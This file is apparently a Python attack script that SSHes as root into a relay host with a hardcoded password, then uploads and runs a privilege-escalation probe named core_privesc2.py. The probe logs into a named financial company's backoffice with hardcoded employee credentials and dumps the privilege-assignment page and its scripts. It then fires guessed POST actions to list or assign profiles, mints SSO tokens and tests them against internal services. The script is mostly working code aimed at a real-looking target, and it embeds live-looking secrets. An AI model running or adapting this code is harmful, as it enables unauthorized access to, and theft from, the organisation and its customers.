import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b JSESSIONID={s.cookies.get('JSESSIONID','?')}\n\n")

if len(r.text) < 15000:
    sys.stdout.write("LOGIN FAILED\n")
    sys.exit(1)

# ====================================================
# 1. GET privilegios.do — main privilege assignment page
# ====================================================
sys.stdout.write("="*60 + "\n=== privilegios.do ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/backoffice/privilegios.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")

# Full HTML dump
sys.stdout.write(f"\n--- FULL HTML ---\n{r.text}\n--- END HTML ---\n\n")

# Extract forms, selects, inputs
forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*(?:name="([^"]*)")?[^>]*method="([^"]*)"?', r.text, re.I)
sys.stdout.write(f"Forms: {forms}\n")

inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
sys.stdout.write(f"Inputs: {inputs}\n")

selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
for sel_name, sel_body in selects:
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"\nSelect '{sel_name}' ({len(options)} options):\n")
    for val, text in options[:50]:
        sys.stdout.write(f"  [{val}] {text}\n")

# Extract JS
js_refs = re.findall(r'src="([^"]*\.js[^"]*)"', r.text)
sys.stdout.write(f"\nJS files: {js_refs}\n")

# ====================================================
# 2. GET funcionesPerfiles.js — understand the logic
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== funcionesPerfiles.js ===\n" + "="*60 + "\n\n")
for js_path in ["/CodigoJS/funcionesPerfiles.js", "/CodigoJS/Perfiles.js"]:
    try:
        r2 = s.get(f"https://core.findep.mx{js_path}", timeout=10)
        sys.stdout.write(f"[{r2.status_code}] {js_path} ({len(r2.text)}b)\n")
        if r2.status_code == 200:
            sys.stdout.write(f"{r2.text[:5000]}\n")
            if len(r2.text) > 5000:
                sys.stdout.write(f"\n...(truncated, full={len(r2.text)}b)...\n")
                sys.stdout.write(f"{r2.text[5000:10000]}\n")
    except Exception as e:
        sys.stdout.write(f"ERR {js_path}: {e}\n")

# ====================================================
# 3. GET funcionesPrivilegios.js or similar
# ====================================================
js_variants = [
    "/CodigoJS/funcionesPrivilegios.js",
    "/CodigoJS/privilegios.js",
    "/CodigoJS/Privilegios.js",
    "/CodigoJS/funcionesModulos.js",
    "/CodigoJS/funcionesPerfil.js",
    "/js/privilegios.js",
    "/js/perfiles.js",
]
for js in js_variants:
    try:
        r3 = s.get(f"https://core.findep.mx{js}", timeout=5)
        if r3.status_code == 200 and len(r3.text) > 100:
            sys.stdout.write(f"\n*** FOUND {js} ({len(r3.text)}b) ***\n")
            sys.stdout.write(f"{r3.text[:5000]}\n")
    except:
        pass

# ====================================================
# 4. Try POST to privilegios.do to list/assign
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== POST ATTEMPTS ===\n" + "="*60 + "\n\n")

# Try listing users/profiles
post_attempts = [
    ("privilegios.do", {"action": "list"}),
    ("privilegios.do", {"action": "consultar"}),
    ("privilegios.do", {"accion": "consultar"}),
    ("privilegios.do", {"cve_usr": "jcruzval"}),
    ("privilegios.do", {"idEmpleado": "jcruzval", "action": "search"}),
    ("grdaPerfil.do", {"cve_usr": "jcruzval"}),
    ("consultaPerfil.do", {"cve_usr": "jcruzval"}),
]

for path, data in post_attempts:
    try:
        r = s.post(f"https://core.findep.mx/backoffice/{path}",
                   data=data, timeout=10, allow_redirects=False)
        if r.status_code != 404 and len(r.text) != 1149:
            sys.stdout.write(f"  POST /{path} {data} => [{r.status_code}] ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) > 2000:
                # Look for profile/module data
                profiles = re.findall(r'(?:perfil|modulo|finanza|privilegio|acceso|permiso)[^<]{0,200}', r.text, re.I)
                sys.stdout.write(f"    Matches: {profiles[:10]}\n")
                sys.stdout.write(f"    Snippet: {r.text[:1000]}\n")
    except:
        pass
    sys.stdout.flush()

# ====================================================
# 5. Try SSO tokens against internal services via tysonprod
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== SSO TOKEN vs INTERNAL SERVICES ===\n" + "="*60 + "\n\n")

# Mint a fresh token for catalogs-service
try:
    r_tok = requests.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
        json={"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "catalogs-service"},
        timeout=10, verify=False, headers={"Content-Type": "application/json", "User-Agent": UA})
    token_data = r_tok.json()
    tok = token_data.get("token", "")
    sys.stdout.write(f"Fresh token: {tok[:80]}...\n\n")
except Exception as e:
    tok = ""
    sys.stdout.write(f"Token mint ERR: {e}\n")

if tok:
    # Try against various tysonprod endpoints with Bearer
    svc_eps = [
        ("catalogs-service.tysonprod.com", "/"),
        ("catalogs-service.tysonprod.com", "/v1/catalogs"),
        ("catalogs-service.tysonprod.com", "/v1/banks"),
        ("catalogs-service.tysonprod.com", "/v1/states"),
        ("catalogs-service.tysonprod.com", "/api/catalogs"),
        ("multimedia-findep-service.tysonprod.com", "/"),
        ("multimedia-findep-service.tysonprod.com", "/v1/files"),
        ("multimedia-findep-service.tysonprod.com", "/health"),
        ("orchestrator-gestiona-service-v2.tysonprod.com", "/"),
        ("orchestrator-gestiona-service-v2.tysonprod.com", "/v1/accounts"),
        ("orchestrator-gestiona-service-v2.tysonprod.com", "/health"),
        ("bff-sso-apps-service.tysonprod.com", "/v1/api/auth/app/token"),
        ("bff-sso-apps-service.tysonprod.com", "/health"),
    ]
    
    for host, path in svc_eps:
        try:
            r = requests.get(f"https://{host}{path}",
                headers={"Authorization": f"Bearer {tok}", "User-Agent": UA,
                         "Accept": "application/json"},
                timeout=8, verify=False, allow_redirects=False)
            if r.status_code != 403 or len(r.text) > 50:
                sys.stdout.write(f"  [{r.status_code}] {host}{path} ({len(r.text)}b)\n")
                sys.stdout.write(f"    {r.text[:400]}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR {host}{path}: {str(e)[:60]}\n")
        sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_privesc2.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_privesc2.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
